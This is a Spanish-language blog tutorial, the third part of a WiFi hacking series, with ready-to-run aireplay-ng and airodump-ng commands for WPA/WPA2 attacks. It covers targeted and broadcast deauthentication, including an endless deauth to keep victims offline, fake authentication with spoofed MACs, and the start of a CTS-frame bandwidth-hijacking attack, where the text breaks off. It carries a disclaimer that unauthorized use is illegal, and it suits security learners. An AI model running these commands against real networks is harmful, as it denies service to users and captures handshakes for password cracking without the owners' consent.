---
layout: single
title: Wifi Hacking 3, Ataques
excerpt: "En este articulo veremos unos cuantos ataques para las redes WPA y WPA 2, los cuales podremos lanzar con distintas finalidades."
date: 2022-07-05
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/Wifi-Hacking/wifi.webp
categories:
  - Wifi-Hacking
tags:  
  - Wifi-Hacking
---

Vale, una vez visto lo anterior ya nos podemos poner manos a la obra con una parte bastante atractiva de esto, los ataques, aquí veremos ataques de varios tipos y como los podemos utilizar con distintos fines, pero antes de nada `YO NO ME HAGO RESPONSABLE DEL MAL USO QUE SE LE PUEDAN DAR A ESTOS CONOCIMIENTOS`, ya que como todo esto se puede usar para el bien, pero también se puede utilizar para el mal y creo que no hace falta aclarar que `Cualquier ataque de estos en una red en la que no tengamos permiso de efectuarlos es completamente ILEGAL`. Una vez aclarado esto ya nos podemos poner manos a la obra. uwu

![](/assets/images/Wifi-Hacking/wifi-hacking.jpg)

`(antes de nada hay que aclarar que todos estos ataques, capturar paquetes y todo eso... se puede hacer sin estar conectados a la red que queremos atacar, es decir que no necesitamos saber la contraseña, solo necesitaremos saberla para snifar la red, ya que la información viaja encriptada y sin la contraseña no podremos verla en texto claro)`


## ATAQUE DE DEAUTENTICACIÓN DIRIGIDO

Con este ataque básicamente `vamos a desconectar a un usuario` de la red que queramos. Si vemos que `los frames están aumentando, significa que el usuario está activo` y por lo tanto, se va a `reconectar` y ahí podremos capturar el `handshake`. Claro, también podemos querer que el usuario `no se pueda conectar` entonces podemos desconectarlo continuamente.

```
#Deautenticar / Desconectar a un usuario una vez
> aireplay -0 {paquetes que quieres emitirle (por ejemplo 10)} -e {nombre de la red} -c {MAC del cliente} {tarjeta de red en modo monitor}

#Otra forma de hacerlo
> aireplay --deauth 2000 -a {bssid de la red} -c {MAC víctima} {tarjeta de red} (esta es 	otra opción de hacerlo)


# IMPORTANTE: si queremos que ese cliente no se pueda conectar, en el número de paquetes ponemos 0 y se estarán mandando paquetes de deautenticación uno tras otro hasta que tú hagas Control+C o cierres la consola.
```

Ejemplo:

![](/assets/images/Wifi-Hacking/Deauth-dirigido.PNG)


## ATAQUE DE DEAUTENTICACIÓN GLOBAL

Esto es lo mismo que el anterior, pero para desconectar a todos los clientes, de esta forma `es más probable conseguir uno o varios handshakes`. O también se puede utilizar para otros fines.

Para esto reemplazaremos la MAC del cliente víctima por la `broadcast MAC: FF:FF:FF:FF:FF:FF` y asi seleccionaremos `todos los clientes` para desconectarlos. Aunque aireplay-ng tiene una facilidad con la cual si no ponemos ninguna MAC, por defecto seleccionará todos los usuarios.

```
#Forma 1
> aireplay-ng -0 10 -e {nombre de la red} -c FF:FF:FF:FF:FF:FF {nombre de la tarjeta de red}

#Forma 2 (la que facilita aireplay)
> aireplay-ng -0 10 -e {nombre de la red} {tarjeta de red}

# IMPORTANTE: aquí también podemos hacer que no se puedan reconectar
```


## ATAQUE DE FALSA AUTENTICACIÓN

Teoría: `no sirve para capturar handshakes`, ya que los `falsos clientes` no tienen la 	contraseña, pero `sirve para otro tipo de ataques que se verán más adelante`. Lo que	haces es engañar al router para que crea que se ha conectado un nuevo cliente.

Primero con `macchanger -l` buscamos una mac de un dispositivo que pueda estar en esa red, por ejemplo un telefono huawei.

```
> aireplay-ng -1 0 -e {nombre de la red} -a {BSSID de la red} -h {Mac del dispositivo que hemos buscado}:{3 pares de caracteres para terminar la MAC, inventados}	{nombre de la tarjeta de red}
```
Y ahora si observamos la red veremos que se ha conectado un usuario que mientras no le hagamos ningún ataque no cambiará el número de frames.


## CTF FRAME ATTACK: secuestro del ancho de banda

Teoría: si dos clientes mandan paquetes parecidos al mismo tiempo pueden colisionar, así que en una red cada cliente tiene que pedir turno para hablar (RTS: request to send), por lo que si tú pides turno, pero para muchísimos paquetes seguidos puedes hacer que la mayoría de ancho de banda o todo este para ti, ya que tú tienes el turno de enviarle paquetes al router durante un tiempo que especifiques al efectuar el ataque. La duración se manda en microsegundos, desde el 0 hasta el 32767. Entonces, la idea como atacante es poner un valor bastante alto (30000). 	Aunque hay que poner primer número el más bajo y último el más alto (en hexadecimal). La idea es que cuando emitamos el ataque la red va a congestionar y la mayoría de dispositivos se van a desconectar.

Primero exportamos todas las evidencias, pero no desconectamos a nadie:
```
> airodump-ng -c 1 -w Captura --bssid {BSSID de la red} {tarjeta de red}
```

Ahora habriremos la captura con wireshark:
```
> wireshark Captura-01.cap (o la captura que sea)
```

Vale, ahora toca una parte que no se muy bien como explicar, asi que me apoyare en imagenes.

En wireshark: aplica filtro; wlan.fc.type_subtype==28 

![](/assets/images/Wifi-Hacking/ctf-attack-1.PNG)

Luego clica en un paquete que quieras o te llame la atención y "Export Specified Packets" 

![](/assets/images/Wifi-Hacking/ctf-attack-2.PNG)

Y guárdalo en el	formato "Wreshark/tcdump/... - cap", `pero tienes que seleccionar la opción de "solo paquetes seleccionados"`.

